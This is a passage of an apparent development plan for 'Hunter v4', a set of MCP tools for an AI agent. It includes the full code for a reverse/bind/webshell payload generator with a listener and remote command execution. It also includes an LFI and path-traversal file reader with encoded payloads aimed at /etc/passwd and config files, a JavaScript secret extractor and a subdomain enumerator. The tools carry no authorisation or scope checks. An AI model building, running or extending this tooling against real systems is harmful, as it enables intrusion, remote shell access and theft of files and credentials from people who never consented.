# tools/shell_tool.py
"""Hunter v4 — Shell Manager

Shell session management: reverse shell listener, webshell deployment,
command execution on active shells.
"""

import base64
import socket
import subprocess
import sys
import threading
import time
from pathlib import Path
from typing import Optional

sys.path.insert(0, str(Path(__file__).parent.parent))

from shells.shell_manager import REVERSE_SHELLS, BIND_SHELLS, WEBSHELLS

# Active shell sessions
_sessions: dict[str, dict] = {}
_session_counter = 0


def shell_impl(action: str = "list", session_id: str = "", type: str = "reverse",
               lhost: str = "", lport: int = 4444, shell_type: str = "bash",
               command: str = "") -> dict:
    """Manage shell sessions.

    Actions:
    - generate: Generate shell payload
    - start: Start reverse shell listener
    - list: List active shell sessions
    - exec: Execute command on active shell
    - close: Close shell session
    """
    global _session_counter

    if action == "generate":
        return _generate_payload(type, lhost, lport, shell_type)

    elif action == "start":
        return _start_listener(lhost, lport)

    elif action == "list":
        return {
            "sessions": [
                {"session_id": sid, "type": s["type"], "status": s["status"], "info": s.get("info", "")}
                for sid, s in _sessions.items()
            ]
        }

    elif action == "exec":
        if session_id not in _sessions:
            return {"error": f"Session {session_id} not found"}
        return _exec_command(session_id, command)

    elif action == "close":
        if session_id not in _sessions:
            return {"error": f"Session {session_id} not found"}
        _sessions[session_id]["status"] = "closed"
        return {"session_id": session_id, "status": "closed"}

    else:
        return {"error": f"Unknown action: {action}"}


def _generate_payload(type: str, lhost: str, lport: int, shell_type: str) -> dict:
    """Generate shell payload."""
    if type == "reverse":
        if shell_type not in REVERSE_SHELLS:
            return {"error": f"Unknown shell type: {shell_type}. Available: {list(REVERSE_SHELLS.keys())}"}
        payload = REVERSE_SHELLS[shell_type].format(lhost=lhost, lport=lport)
        return {
            "type": "reverse",
            "shell_type": shell_type,
            "payload": payload,
            "lhost": lhost,
            "lport": lport,
        }
    elif type == "bind":
        if shell_type not in BIND_SHELLS:
            return {"error": f"Unknown bind shell type: {shell_type}"}
        payload = BIND_SHELLS[shell_type].format(port=lport)
        return {"type": "bind", "shell_type": shell_type, "payload": payload, "port": lport}
    elif type == "webshell":
        if shell_type not in WEBSHELLS:
            return {"error": f"Unknown webshell type: {shell_type}. Available: {list(WEBSHELLS.keys())}"}
        return {"type": "webshell", "shell_type": shell_type, "payload": WEBSHELLS[shell_type]}
    else:
        return {"error": f"Unknown type: {type}. Use: reverse, bind, webshell"}


def _start_listener(lhost: str, lport: int) -> dict:
    """Start a reverse shell listener."""
    global _session_counter
    _session_counter += 1
    session_id = f"shell_{_session_counter:03d}"

    _sessions[session_id] = {
        "type": "reverse",
        "status": "listening",
        "lhost": lhost,
        "lport": lport,
        "conn": None,
        "info": "",
    }

    def listener_thread():
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((lhost, lport))
            server.settimeout(300)  # 5 min timeout
            server.listen(1)

            conn, addr = server.accept()
            _sessions[session_id]["conn"] = conn
            _sessions[session_id]["status"] = "active"
            _sessions[session_id]["info"] = f"connected from {addr[0]}:{addr[1]}"

            # Send initial probe
            conn.send(b"echo HUNTER_CONNECTED && id && uname -a\n")
            time.sleep(1)
            initial = conn.recv(4096).decode("utf-8", errors="ignore")
            if "HUNTER_CONNECTED" in initial:
                _sessions[session_id]["info"] += f" | {initial.split('HUNTER_CONNECTED')[1].strip()[:100]}"

            server.close()
        except Exception as e:
            _sessions[session_id]["status"] = "error"
            _sessions[session_id]["info"] = str(e)

    thread = threading.Thread(target=listener_thread, daemon=True)
    thread.start()

    return {
        "session_id": session_id,
        "status": "listening",
        "lhost": lhost,
        "lport": lport,
    }


def _exec_command(session_id: str, command: str) -> dict:
    """Execute command on active shell."""
    session = _sessions.get(session_id)
    if not session or session["status"] != "active":
        return {"error": f"Session {session_id} is not active"}

    conn = session.get("conn")
    if not conn:
        return {"error": "No connection in session"}

    try:
        # Send command
        conn.send(f"{command}\n".encode())
        time.sleep(1)

        # Read response
        output = b""
        conn.settimeout(2)
        while True:
            try:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                output += chunk
            except socket.timeout:
                break

        return {
            "session_id": session_id,
            "command": command,
            "stdout": output.decode("utf-8", errors="ignore"),
            "stderr": "",
            "exit_code": 0,
        }
    except Exception as e:
        return {
            "session_id": session_id,
            "command": command,
            "stdout": "",
            "stderr": str(e),
            "exit_code": 1,
        }
```

- [ ] **Step 2: Register in MCP server**

Add to `mcp_server.py`:

```python
from tools.shell_tool import shell_impl

@mcp.tool()
def shell(action: str = "list", session_id: str = "", type: str = "reverse",
          lhost: str = "", lport: int = 4444, shell_type: str = "bash",
          command: str = "") -> dict:
    """Manage shell sessions.

    Actions:
    - generate: Generate reverse/bind/webshell payload
    - start: Start reverse shell listener (returns session_id)
    - list: List active shell sessions
    - exec: Execute command on active shell
    - close: Close shell session
    """
    result = shell_impl(action=action, session_id=session_id, type=type,
                        lhost=lhost, lport=lport, shell_type=shell_type,
                        command=command)
    # Auto-record shell sessions
    kg = get_kg()
    if action == "start" and "session_id" in result:
        kg.add_shell(session_id=result["session_id"], type="reverse",
                     info=f"{lhost}:{lport}")
    return result
```

- [ ] **Step 3: Commit**

```bash
cd /root/.claude/skills/hunter
git add tools/shell_tool.py mcp_server.py
git commit -m "feat(v4): shell tool — shell session management"
```

---

## Task 14: `js_analyze` + `src_read` + `subdomain` Tools

**Files:**
- Create: `/root/.claude/skills/hunter/tools/js_analyze.py`
- Create: `/root/.claude/skills/hunter/tools/src_read.py`
- Create: `/root/.claude/skills/hunter/tools/subdomain.py`
- Modify: `/root/.claude/skills/hunter/mcp_server.py` (register tools)

- [ ] **Step 1: Implement js_analyze**

```python
# tools/js_analyze.py
"""Hunter v4 — JavaScript Analyzer

Static analysis of JavaScript files: endpoints, secrets, internal URLs.
"""

import re
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from tools.probe import _get_session

# Secret patterns
SECRET_PATTERNS = {
    "aws_key": re.compile(r'AKIA[0-9A-Z]{16}'),
    "aws_secret": re.compile(r'(?i)aws[_-]?secret[_-]?access[_-]?key\s*[:=]\s*["\']?([A-Za-z0-9/+=]{40})'),
    "api_key": re.compile(r'(?i)(api[_-]?key|apikey)\s*[:=]\s*["\']?([A-Za-z0-9_\-]{16,})'),
    "jwt": re.compile(r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'),
    "private_key": re.compile(r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----'),
    "password": re.compile(r'(?i)(password|passwd|pwd)\s*[:=]\s*["\']([^"\']{3,})'),
    "token": re.compile(r'(?i)(token|secret)\s*[:=]\s*["\']?([A-Za-z0-9_\-]{16,})'),
}

# Endpoint patterns
ENDPOINT_PATTERNS = [
    re.compile(r'["\']/(api|v[12]|rest|graphql)[^"\']*["\']'),
    re.compile(r'["\']https?://[^"\']*(?:api|v[12]|rest)[^"\']*["\']'),
    re.compile(r'(?:(?:get|post|put|delete|patch)\s*\(\s*["\'])([^"\']+)'),
    re.compile(r'(?:(?:fetch|axios|request)\s*\(\s*["\'])([^"\']+)'),
]

# Internal URL patterns
INTERNAL_PATTERNS = [
    re.compile(r'https?://(?:192\.168|10\.|172\.(?:1[6-9]|2\d|3[01]))\.[^\s"\']+'),
    re.compile(r'https?://(?:localhost|127\.0\.0\.1|0\.0\.0\.0)[^\s"\']*'),
    re.compile(r'https?://[a-z0-9-]+\.(?:internal|local|corp|private)[^\s"\']*'),
]

# Interesting patterns
INTERESTING_PATTERNS = {
    "hardcoded_password": re.compile(r'(?i)(?:password|passwd|pwd|secret)\s*[:=]\s*["\'][^"\']{3,}["\']'),
    "debug_flag": re.compile(r'(?i)DEBUG\s*[:=]\s*(?:true|1|yes)'),
    "console_log": re.compile(r'console\.(log|debug|error|warn)\s*\('),
    "eval_usage": re.compile(r'\beval\s*\('),
    "innerHTML": re.compile(r'\.innerHTML\s*='),
    "document_write": re.compile(r'document\.write\s*\('),
}


def js_analyze_impl(url: str) -> dict:
    """Analyze JavaScript file for endpoints, secrets, and interesting patterns."""
    session = _get_session()

    try:
        resp = session.get(url, timeout=15)
        source = resp.text
    except Exception as e:
        return {"url": url, "error": str(e)}

    # Extract endpoints
    endpoints = set()
    for pattern in ENDPOINT_PATTERNS:
        for match in pattern.finditer(source):
            endpoint = match.group(1) if match.lastindex else match.group(0)
            endpoint = endpoint.strip("\"'")
            if endpoint.startswith("/") or endpoint.startswith("http"):
                endpoints.add(endpoint)

    # Extract secrets
    secrets = []
    for name, pattern in SECRET_PATTERNS.items():
        for match in pattern.finditer(source):
            value = match.group(0)
            # Get line number
            line_num = source[:match.start()].count("\n") + 1
            secrets.append({"type": name, "value": value[:80], "line": line_num})

    # Extract internal URLs
    internal_urls = set()
    for pattern in INTERNAL_PATTERNS:
        for match in pattern.finditer(source):
            internal_urls.add(match.group(0))

    # Find interesting patterns
    interesting = []
    for name, pattern in INTERESTING_PATTERNS.items():
        for match in pattern.finditer(source):
            line_num = source[:match.start()].count("\n") + 1
            context_start = max(0, match.start() - 20)
            context_end = min(len(source), match.end() + 20)
            context = source[context_start:context_end].strip()
            interesting.append({"pattern": name, "context": context[:100], "line": line_num})

    return {
        "url": url,
        "size": len(source),
        "endpoints": sorted(endpoints),
        "secrets": secrets,
        "internal_urls": sorted(internal_urls),
        "interesting_patterns": interesting,
        "source_preview": source[:5000],
    }
```

- [ ] **Step 2: Implement src_read**

```python
# tools/src_read.py
"""Hunter v4 — Target File Reader

Read files from target via LFI, directory traversal, or source code disclosure.
"""

import sys
from pathlib import Path
from typing import Optional

sys.path.insert(0, str(Path(__file__).parent.parent))

from tools.probe import _get_session


# LFI payload templates
LFI_PAYLOADS = {
    "lfi_simple": "{path}",
    "lfi_dotdot": "....//....//....//....//{path}",
    "lfi_double_encode": "%252e%252e%252f%252e%252e%252f{path}",
    "lfi_null_byte": "{path}%00",
    "lfi_php_filter": "php://filter/convert.base64-encode/resource={path}",
    "lfi_php_input": "php://input",
}


def src_read_impl(url: str, param: str = "", technique: str = "lfi",
                  paths: list[str] = None, method: str = "GET") -> dict:
    """Read files from target using various techniques."""
    if not paths:
        return {"error": "No paths to read"}

    session = _get_session()
    results = []

    for path in paths:
        result = _read_single(session, url, param, technique, path, method)
        results.append(result)

    return {
        "technique": technique,
        "results": results,
    }


def _read_single(session, url: str, param: str, technique: str, path: str, method: str) -> dict:
    """Attempt to read a single file."""
    try:
        if technique == "lfi" and param:
            # Try multiple LFI techniques
            for payload_name, payload_template in LFI_PAYLOADS.items():
                payload = payload_template.format(path=path.lstrip("/"))
                if method.upper() == "GET":
                    separator = "&" if "?" in url else "?"
                    target = f"{url}{separator}{param}={payload}"
                else:
                    target = url

                try:
                    if method.upper() == "GET":
                        resp = session.get(target, timeout=10, allow_redirects=True)
                    else:
                        resp = session.post(target, data={param: payload}, timeout=10)

                    content = resp.text

                    # Check if we got real content (not error page)
                    if _is_valid_response(content, path):
                        return {
                            "path": path,
                            "success": True,
                            "technique": payload_name,
                            "content": content,
                            "size": len(content),
                        }
                except Exception:
                    continue

            return {"path": path, "success": False, "error": "All LFI techniques failed"}

        elif technique == "git":
            # Try .git source disclosure
            git_url = f"{url.rstrip('/')}/.git/{path}"
            resp = session.get(git_url, timeout=10)
            if resp.status_code == 200 and len(resp.text) > 0:
                return {
                    "path": path,
                    "success": True,
                    "technique": "git_disclosure",
                    "content": resp.text,
                    "size": len(resp.text),
                }
            return {"path": path, "success": False, "error": f"HTTP {resp.status_code}"}

        elif technique == "traversal":
            # Try path traversal
            traversal_payloads = [
                f"....//....//....//....//{path.lstrip('/')}",
                f"..%2f..%2f..%2f..%2f{path.lstrip('/')}",
                f"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{path.lstrip('/')}",
            ]
            for payload in traversal_payloads:
                separator = "&" if "?" in url else "?"
                target = f"{url}{separator}{param}={payload}" if param else f"{url}/{payload}"
                try:
                    resp = session.get(target, timeout=10)
                    if _is_valid_response(resp.text, path):
                        return {
                            "path": path,
                            "success": True,
                            "technique": "traversal",
                            "content": resp.text,
                            "size": len(resp.text),
                        }
                except Exception:
                    continue
            return {"path": path, "success": False, "error": "Traversal failed"}

        else:
            return {"path": path, "success": False, "error": f"Unknown technique: {technique}"}

    except Exception as e:
        return {"path": path, "success": False, "error": str(e)}


def _is_valid_response(content: str, path: str) -> bool:
    """Check if response contains valid file content (not error page)."""
    if not content or len(content) < 10:
        return False

    # Check for common error indicators
    error_indicators = ["404 not found", "403 forbidden", "error", "exception", "traceback"]
    if any(indicator in content.lower()[:200] for indicator in error_indicators):
        return False

    # Check for file-specific content
    if "/etc/passwd" in path:
        return "root:" in content or "nobody:" in content
    if ".php" in path:
        return "<?php" in content or "<?=" in content
    if ".py" in path:
        return "import " in content or "def " in content
    if ".conf" in path or ".yml" in path:
        return True  # Any non-error content is likely valid

    return True
```

- [ ] **Step 3: Implement subdomain**

```python
# tools/subdomain.py
"""Hunter v4 — Subdomain Discovery

Subdomain enumeration via crt.sh and DNS brute force.
"""

import socket
import subprocess
import sys
import time
from pathlib import Path
from typing import Optional

sys.path.insert(0, str(Path(__file__).parent.parent))

from tools.probe import _get_session

# Common subdomain prefixes for brute force
BRUTE_PREFIXES = [
    "www", "mail", "ftp", "smtp", "pop", "imap", "webmail", "remote",
    "vpn", "ns1", "ns2", "dns", "dns1", "dns2", "mx", "mx1", "mx2",
    "test", "dev", "staging", "beta", "alpha", "demo", "sandbox",
    "api", "app", "web", "portal", "admin", "panel", "dashboard",
    "blog", "forum", "wiki", "docs", "help", "support", "status",
    "cdn", "static", "media", "img", "images", "assets", "files",
    "db", "database", "mysql", "postgres", "redis", "mongo", "elastic",
    "git", "gitlab", "github", "svn", "ci", "cd", "jenkins", "build",
    "monitor", "grafana", "prometheus", "kibana", "elk", "log",
    "auth", "sso", "login", "oauth", "ldap", "cas", "saml",
    "oa", "crm", "erp", "hr", "finance", "pay", "billing",
    "shop", "store", "ecommerce", "cart", "order", "payment",
    "mobile", "m", "wap", "ios", "android", "app",
    "internal", "intranet", "corp", "office", "vpn", "gateway",
    "proxy", "lb", "ha", "backup", "bak", "old", "archive",
]


def subdomain_impl(domain: str, methods: list[str] = None) -> dict:
    """Discover subdomains for a domain."""
    if methods is None:
        methods = ["crtsh", "dns_brute"]

    start = time.time()
    all_subdomains = {}  # subdomain -> {source, ip}

    if "crtsh" in methods:
        crtsh_results = _crtsh_search(domain)
        for sub, info in crtsh_results.items():
            all_subdomains[sub] = info

    if "dns_brute" in methods:
        brute_results = _dns_brute(domain)
        for sub, info in brute_results.items():
            if sub not in all_subdomains:
                all_subdomains[sub] = info

    if "subfinder" in methods:
        subfinder_results = _subfinder(domain)
        for sub, info in subfinder_results.items():
            if sub not in all_subdomains:
                all_subdomains[sub] = info

    # Resolve IPs for new entries
    for sub, info in all_subdomains.items():
        if not info.get("ip"):
            try:
                ip = socket.gethostbyname(sub)
                info["ip"] = ip
            except socket.gaierror:
                info["ip"] = ""

    elapsed_ms = int((time.time() - start) * 1000)

    return {
        "domain": domain,
        "subdomains": [
            {"subdomain": sub, "source": info.get("source", "unknown"), "ip": info.get("ip", "")}
            for sub, info in sorted(all_subdomains.items())
        ],
        "total_found": len(all_subdomains),
        "elapsed_ms": elapsed_ms,
    }


def _crtsh_search(domain: str) -> dict:
    """Search crt.sh for certificate transparency logs."""
    results = {}
    try:
        session = _get_session()
        resp = session.get(f"https://crt.sh/?q=%.{domain}&output=json", timeout=15)
        if resp.status_code == 200:
            import json
            data = json.loads(resp.text)
            for entry in data:
                name = entry.get("name_value", "")
                for sub in name.split("\n"):
                    sub = sub.strip().lower()
                    if sub.endswith(f".{domain}") and "*" not in sub:
                        results[sub] = {"source": "crtsh"}
    except Exception:
        pass
    return results


def _dns_brute(domain: str) -> dict:
    """DNS brute force with common prefixes."""
    results = {}
    for prefix in BRUTE_PREFIXES:
        subdomain = f"{prefix}.{domain}"
        try:
            ip = socket.gethostbyname(subdomain)
            results[subdomain] = {"source": "dns_brute", "ip": ip}
        except socket.gaierror:
            continue
    return results


def _subfinder(domain: str) -> dict:
    """Try subfinder if available."""
    results = {}
    try:
        result = subprocess.run(
            ["subfinder", "-d", domain, "-silent"],
            capture_output=True, text=True, timeout=60
        )
        if result.returncode == 0:
            for line in result.stdout.strip().split("\n"):
                sub = line.strip().lower()
                if sub:
                    results[sub] = {"source": "subfinder"}
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass
    return results
```

- [ ] **Step 4: Register all three in MCP server**

Add to `mcp_server.py`:

```python
from tools.js_analyze import js_analyze_impl
from tools.src_read import src_read_impl
from tools.subdomain import subdomain_impl

@mcp.tool()
def js_analyze(url: str) -> dict:
    """Analyze JavaScript file for endpoints, secrets, and internal URLs.

    Returns: endpoints, secrets (AWS keys, API keys, JWTs), internal URLs,
    interesting patterns (hardcoded passwords, debug flags, eval usage).
    """
    result = js_analyze_impl(url=url)
    kg = get_kg()
    for secret in result.get("secrets", []):
        kg.add_finding(
            type="secret",
            severity="high",
            title=f"{secret['type']} found in JS",
            detail=f"Line {secret['line']}: {secret['value'][:50]}",
            evidence={"url": url, "type": secret["type"]},
            tool="js_analyze"
        )
    return result


@mcp.tool()
def src_read(url: str, param: str = "", technique: str = "lfi",
             paths: list[str] = [], method: str = "GET") -> dict:
    """Read files from target via LFI, directory traversal, or source disclosure.

    technique: lfi, git, traversal
    paths: list of file paths to read (e.g., ["/etc/passwd", "/var/www/config.php"])
    Returns full file content for each successfully read file.
    """
    result = src_read_impl(url=url, param=param, technique=technique,
                           paths=paths, method=method)
    kg = get_kg()
    for r in result.get("results", []):
        if r.get("success"):
            kg.add_finding(
                type="file_read",
                severity="critical",
                title=f"File read: {r['path']}",
                detail=f"Technique: {r.get('technique', 'unknown')}, Size: {r.get('size', 0)}",
                evidence={"path": r["path"], "technique": r.get("technique")},
                tool="src_read"
            )
    return result


@mcp.tool()
def subdomain(domain: str, methods: list[str] = ["crtsh", "dns_brute"]) -> dict:
    """Discover subdomains for a domain.

    methods: crtsh (certificate transparency), dns_brute (DNS brute force), subfinder
    Returns subdomains with source and resolved IP.
    """
    return subdomain_impl(domain=domain, methods=methods)
```

- [ ] **Step 5: Commit**

```bash
cd /root/.claude/skills/hunter
git add tools/js_analyze.py tools/src_read.py tools/subdomain.py mcp_server.py
git commit -m "feat(v4): js_analyze, src_read, subdomain tools"
```

---

## Task 15: Final MCP Server Assembly + Test

**Files:**
- Modify: `/root/.claude/skills/hunter/mcp_server.py`

- [ ] **Step 1: Verify all tools are registered**

```bash
cd /root/.claude/skills/hunter
python3 -c "
from mcp_server import mcp
# List all registered tools
tools = mcp._tool_manager._tools
print(f'Registered tools: {len(tools)}')
for name in sorted(tools.keys()):
    print(f'  - {name}')
"
```

Expected: 12 tools listed (session, probe, port_scan, dns, dir_enum, tech, js_analyze, src_read, inject, shell, exec, subdomain)

- [ ] **Step 2: Run all tests**

```bash
cd /root/.claude/skills/hunter
python3 -m pytest tests/ -v --tb=short 2>&1 | head -60
```

Expected: All tests PASS

- [ ] **Step 3: Create sessions directory**

```bash
mkdir -p /root/.claude/skills/hunter/sessions
```

- [ ] **Step 4: Final commit**

```bash
cd /root/.claude/skills/hunter
git add -A
git commit -m "feat(v4): Hunter v4 complete — 12 MCP tools + knowledge graph"
```

---

## Phase Summary

### Phase 1 (Tasks 1-10): Skeleton + Recon
- MCP server framework
- Knowledge graph
- probe, port_scan, dns, dir_enum, tech tools
- session tool
- Integration test
- Updated SKILL.md

### Phase 2 (Tasks 11-14): Analysis + Exploitation
- inject tool (injection testing)
- exec tool (Python code execution)
- shell tool (shell management)
- js_analyze, src_read, subdomain tools

### Phase 3 (Task 15): Assembly + Polish
- Final assembly
- All tests passing
- Documentation complete

---

## Verification Checklist

After completing all tasks:

- [ ] `python3 mcp_server.py` starts without errors
- [ ] All 12 tools registered
- [ ] All tests pass: `python3 -m pytest tests/ -v`
- [ ] Session persistence works: create session → save → load
- [ ] Knowledge graph auto-records findings from tool calls
- [ ] SKILL.md updated with v4 documentation
- [ ] Git history clean with descriptive commits
